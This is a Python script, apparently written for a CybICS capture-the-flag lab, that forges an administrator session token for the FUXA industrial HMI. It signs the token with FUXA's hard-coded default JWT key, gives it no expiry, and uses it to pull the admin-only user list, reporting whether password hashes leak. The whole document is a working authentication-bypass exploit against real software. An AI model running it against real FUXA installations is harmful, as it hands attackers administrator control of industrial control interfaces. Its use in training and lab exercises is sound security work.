#!/usr/bin/env python3
"""
Forge a FUXA session token with a known signing key.

FUXA (the CybICS HMI) signs its JSON Web Tokens with HS256. Without a
`secretCode` in its settings.js it uses the key hard-coded in its source code,
api/jwt-helper.js. This script signs a token with that key (or another one
given with --secret), asks FUXA for its admin-only user list with it and
prints the token.

Only the Python standard library is used.

    python3 fuxa_jwt.py                       # forge for user "ghost", groups -1
    python3 fuxa_jwt.py --user nobody --host 172.18.0.4
    python3 fuxa_jwt.py --secret 'my new key'  # does a changed key still match?
    python3 fuxa_jwt.py --lifetime 7200        # add iat/exp, valid for two hours

Without --lifetime the token has no expiry claim at all, and FUXA accepts it
for ever: the key, not the token, is what limits a forged session.
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
import urllib.error
import urllib.request

DEFAULT_SECRET = "frangoteam751"   # @frangoteam/fuxa-min 1.2.6, api/jwt-helper.js


def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge(payload, secret):
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    body = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signature = hmac.new(secret.encode(), f"{header}.{body}".encode(), hashlib.sha256).digest()
    return f"{header}.{body}.{b64url(signature)}"


def get_users(base, token=None):
    request = urllib.request.Request(f"{base}/api/users")
    if token:
        request.add_header("x-access-token", token)
    try:
        with urllib.request.urlopen(request, timeout=10) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as err:
        return err.code, None


def main():
    parser = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    parser.add_argument("--host", default="172.18.0.4", help="FUXA address (default 172.18.0.4)")
    parser.add_argument("--port", type=int, default=1881)
    parser.add_argument("--user", default="ghost", help="the 'id' claim (default ghost)")
    parser.add_argument("--groups", type=int, default=-1, help="the 'groups' claim (-1 = admin)")
    parser.add_argument("--secret", default=DEFAULT_SECRET, help="signing key to try")
    parser.add_argument("--lifetime", type=int, default=0,
                        help="add iat and exp, valid for this many seconds (default: no expiry)")
    args = parser.parse_args()
    base = f"http://{args.host}:{args.port}"

    status, _ = get_users(base)
    print(f"[*] GET /api/users without a token: HTTP {status}")

    payload = {"id": args.user, "groups": args.groups}
    if args.lifetime > 0:
        now = int(time.time())
        payload.update(iat=now, exp=now + args.lifetime)
    token = forge(payload, args.secret)
    status, users = get_users(base, token)
    print(f"[*] GET /api/users with the forged token: HTTP {status}")
    if status != 200:
        print("[-] FUXA refused the token: the key is not the one FUXA uses, "
              "or the groups claim is not an admin group.")
        return 1

    print("[+] FUXA treats the forged token as an administrator. Its user list:")
    for user in users:
        # Only say that the hash came along; the point is that it leaks, not its value.
        leaked = "included" if user.get("password") else "not included"
        print(f"    {user.get('username'):<10} groups={user.get('groups'):<4} password hash {leaked}")
    print(f"\n[+] Token ({len(token)} characters), paste it on the challenge page:\n{token}")
    if args.lifetime in (900, 3600, 10800, 86400):
        print("[!] FUXA issues tokens with exactly this lifetime itself, so the challenge cannot "
              "tell yours from one FUXA signed: leave out --lifetime or pick another value.")
    if len(token) > 200:
        print("[!] The challenge field takes at most 200 characters: choose a shorter --user.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
